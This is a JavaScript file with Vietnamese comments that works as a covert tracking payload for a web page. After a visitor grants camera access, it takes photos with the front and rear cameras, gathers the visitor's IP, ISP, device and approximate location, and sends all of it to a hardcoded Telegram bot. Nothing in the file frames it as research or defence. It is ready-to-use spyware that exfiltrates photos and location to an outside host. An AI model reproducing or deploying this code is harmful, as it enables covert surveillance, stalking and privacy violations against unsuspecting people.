const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const info = {
  time: '', ip: '', isp: '', realIp: '', address: '',
  country: '', lat: '', lon: '', device: '', os: '', camera: '✅ Đã chụp camera trước và sau'
};

async function main() {
  try {
    // BƯỚC 1: XIN QUYỀN VÀ CHỤP ẢNH TRƯỚC (QUAN TRỌNG NHẤT)
    // Nếu nó bấm TỪ CHỐI, dòng này sẽ lỗi và nhảy thẳng xuống Catch -> KHÔNG GỬI GÌ HẾT.
    const f = await captureCamera("user");
    if (!f) throw new Error("User denied"); 

    // BƯỚC 2: CHỈ KHI CÓ ẢNH MỚI CHẠY ĐỐNG DƯỚI NÀY
    detectDevice();
    await Promise.all([getNetworkData(), getLocation()]);
    const b = await captureCamera("environment");

    // BƯỚC 3: GỬI VỀ TELE
    await sendReport(f, b);

  } catch (e) {
    // Nếu từ chối, nó chui vào đây và tao cho nó im lặng luôn
    console.log("Dừng mọi hoạt động do thiếu quyền camera.");
  }
}

async function getNetworkData() {
  try {
    const [r1, r2] = await Promise.all([
      fetch('https://api.ipify.org?format=json').then(r => r.json()),
      fetch('https://ipwho.is/').then(r => r.json())
    ]);
    info.ip = r1.ip; 
    info.realIp = r2.ip;
    info.isp = r2.connection?.org || 'VNNIC';
    info.country = r2.country || 'Vietnam';
    if(!info.lat) {
      info.lat = r2.latitude;
      info.lon = r2.longitude;
      info.address = `${r2.city}, ${r2.region} (Vị trí IP)`;
    }
  } catch (e) {}
}

function detectDevice() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  info.time = new Date().toLocaleString('vi-VN');
  // Logic nhận diện iPhone/Android giữ nguyên của mày ở đây...
  info.os = /iPhone|iPad|iPod/i.test(ua) ? 'iOS' : 'Android/PC';
  info.device = platform; 
}

async function captureCamera(facingMode) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
    return new Promise(resolve => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setTimeout(() => {
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop());
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
        }, 800);
      };
    });
  } catch (e) { return null; }
}

async function sendReport(f, b) {
  const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
  const caption = `
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device}
🖥️ Hệ điều hành: ${info.os}
🌍 IP dân cư: ${info.ip}
🧠 IP gốc: ${info.realIp}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
🌎 Quốc gia: ${info.country}
📍 Vĩ độ: ${info.lat}
📍 Kinh độ: ${info.lon}
📌 Google Maps: ${mapsLink}
📸 Camera: ${info.camera}

⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%
`.trim();

  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  const media = [{ type: 'photo', media: 'attach://f', caption: caption }];
  formData.append('f', f, 'f.jpg');
  if (b) {
    media.push({ type: 'photo', media: 'attach://b' });
    formData.append('b', b, 'b.jpg');
  }
  formData.append('media', JSON.stringify(media));
  return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`, { method: 'POST', body: formData });
}
